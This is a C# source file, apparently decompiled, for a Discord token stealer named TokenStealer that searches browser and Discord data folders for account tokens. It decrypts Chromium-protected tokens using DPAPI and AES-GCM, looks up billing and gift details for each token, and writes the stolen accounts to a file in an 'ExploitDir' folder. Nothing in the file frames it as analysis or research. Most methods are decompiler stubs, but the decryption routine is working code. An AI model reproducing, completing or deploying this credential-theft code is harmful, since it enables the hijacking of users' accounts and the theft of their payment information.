﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace SHARP
{
	internal class TokenStealer
	{
		static TokenStealer()
		{
			TokenStealer.Client.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue("application/json"));
			TokenStealer.Client.DefaultRequestHeaders.UserAgent.ParseAdd("Opera/9.80 (Windows NT 6.1; YB/4.0.0) Presto/2.12.388 Version/12.17");
			TokenStealer._accounts = new List<DiscordAccountFormat>();
			TokenStealer.AccountsFilePath = Path.Combine(Help.ExploitDir, "Discord", "Accounts.txt");
		}

		internal static async Task<DiscordAccountFormat[]> GetAccounts()
		{
			TokenStealer.<GetAccounts>d__7 <GetAccounts>d__;
			<GetAccounts>d__.<>t__builder = AsyncTaskMethodBuilder<DiscordAccountFormat[]>.Create();
			<GetAccounts>d__.<>1__state = -1;
			<GetAccounts>d__.<>t__builder.Start<TokenStealer.<GetAccounts>d__7>(ref <GetAccounts>d__);
			return <GetAccounts>d__.<>t__builder.Task;
		}

		private static async Task Run()
		{
			var accounts = await GetAccounts();
			await WriteAccountsToFile();
			RemoveDuplicates();
		}

		private static Task WriteAccountsToFile()
		{
			TokenStealer.<WriteAccountsToFile>d__9 <WriteAccountsToFile>d__;
			<WriteAccountsToFile>d__.<>t__builder = AsyncTaskMethodBuilder.Create();
			<WriteAccountsToFile>d__.<>1__state = -1;
			<WriteAccountsToFile>d__.<>t__builder.Start<TokenStealer.<WriteAccountsToFile>d__9>(ref <WriteAccountsToFile>d__);
			return <WriteAccountsToFile>d__.<>t__builder.Task;
		}

		private static Task MethodA(string path)
		{
			TokenStealer.<MethodA>d__10 <MethodA>d__;
			<MethodA>d__.<>t__builder = AsyncTaskMethodBuilder.Create();
			<MethodA>d__.path = path;
			<MethodA>d__.<>1__state = -1;
			<MethodA>d__.<>t__builder.Start<TokenStealer.<MethodA>d__10>(ref <MethodA>d__);
			return <MethodA>d__.<>t__builder.Task;
		}

		private static Task MethodB(string path)
		{
			TokenStealer.<MethodB>d__11 <MethodB>d__;
			<MethodB>d__.<>t__builder = AsyncTaskMethodBuilder.Create();
			<MethodB>d__.path = path;
			<MethodB>d__.<>1__state = -1;
			<MethodB>d__.<>t__builder.Start<TokenStealer.<MethodB>d__11>(ref <MethodB>d__);
			return <MethodB>d__.<>t__builder.Task;
		}

		private static Task FireFoxMethod(string path)
		{
			TokenStealer.<FireFoxMethod>d__12 <FireFoxMethod>d__;
			<FireFoxMethod>d__.<>t__builder = AsyncTaskMethodBuilder.Create();
			<FireFoxMethod>d__.path = path;
			<FireFoxMethod>d__.<>1__state = -1;
			<FireFoxMethod>d__.<>t__builder.Start<TokenStealer.<FireFoxMethod>d__12>(ref <FireFoxMethod>d__);
			return <FireFoxMethod>d__.<>t__builder.Task;
		}

		private static string DecryptTokenMethodB(byte[] buffer, byte[] protectedKey)
		{
			string result;
			try
			{
				byte[] array = buffer.Skip(15).ToArray<byte>();
				byte[] key = ProtectedData.Unprotect(protectedKey, null, DataProtectionScope.CurrentUser);
				byte[] iv = buffer.Skip(3).Take(12).ToArray<byte>();
				byte[] array2 = array.Skip(array.Length - 16).ToArray<byte>();
				array = array.Take(array.Length - array2.Length).ToArray<byte>();
				byte[] bytes = new AesGcm().Decrypt(key, iv, null, array, array2);
				result = Encoding.UTF8.GetString(bytes);
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
				result = string.Empty;
			}
			return result;
		}

		private static Task<string[]> GetBilling(string token)
		{
			TokenStealer.<GetBilling>d__14 <GetBilling>d__;
			<GetBilling>d__.<>t__builder = AsyncTaskMethodBuilder<string[]>.Create();
			<GetBilling>d__.token = token;
			<GetBilling>d__.<>1__state = -1;
			<GetBilling>d__.<>t__builder.Start<TokenStealer.<GetBilling>d__14>(ref <GetBilling>d__);
			return <GetBilling>d__.<>t__builder.Task;
		}

		private static Task<GiftFormat[]> GetGifts(string token)
		{
			TokenStealer.<GetGifts>d__15 <GetGifts>d__;
			<GetGifts>d__.<>t__builder = AsyncTaskMethodBuilder<GiftFormat[]>.Create();
			<GetGifts>d__.token = token;
			<GetGifts>d__.<>1__state = -1;
			<GetGifts>d__.<>t__builder.Start<TokenStealer.<GetGifts>d__15>(ref <GetGifts>d__);
			return <GetGifts>d__.<>t__builder.Task;
		}

		private static Task AddAccount(string token)
		{
			TokenStealer.<AddAccount>d__16 <AddAccount>d__;
			<AddAccount>d__.<>t__builder = AsyncTaskMethodBuilder.Create();
			<AddAccount>d__.token = token;
			<AddAccount>d__.<>1__state = -1;
			<AddAccount>d__.<>t__builder.Start<TokenStealer.<AddAccount>d__16>(ref <AddAccount>d__);
			return <AddAccount>d__.<>t__builder.Task;
		}

		private static void RemoveDuplicates()
		{
			TokenStealer._accounts = (from t in TokenStealer._accounts
			group t by t.Token into t
			select t.First<DiscordAccountFormat>()).ToList<DiscordAccountFormat>();
		}

		private static readonly string RoamingPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

		private static readonly string LocalAppDataPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

		private static readonly HttpClient Client = new HttpClient();

		private static List<DiscordAccountFormat> _accounts;

		private static List<GiftFormat> _gifts;

		private static readonly string AccountsFilePath;
	}
}
